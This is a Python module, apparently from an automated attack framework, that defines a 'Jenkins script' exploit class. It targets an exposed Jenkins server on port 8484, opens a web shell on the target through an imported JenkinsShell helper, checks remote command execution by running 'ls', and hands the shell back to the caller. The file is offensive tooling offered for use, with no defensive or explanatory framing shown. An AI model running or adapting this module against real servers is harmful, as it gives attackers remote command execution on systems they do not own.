#######################################################
# jenkins script
# (not a CVE/Metasploit module)
#
# This exploit takes advantage of the exposed Jenkins
# server at port 8484. Jenkins is an automation
# server which allows you to run scripts.
#######################################################

from utils import Exploit
import requests
from bs4 import BeautifulSoup
from shells.jenkins_shell import JenkinsShell

class JenkinsScript(Exploit):
    '''Class for performing the Jenkins script exploit'''

    def __init__(self, server_ip: str):
        super().__init__(
            os='windows',
            name='Jenkins script',
            description='',
            requirements=['http/8484'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a shell'''
        webshell = JenkinsShell(target, self.os)
        self.message(target, 'Testing Jenkins service availability...')

        # Return Jenkins shell
        if webshell.cmd('ls'):
            # Return webshell
            self.success(target)
            return webshell
        else:
            self.error(target, 'An unknown error occurred when trying to reach the webshell')
            webshell.kill()
            return
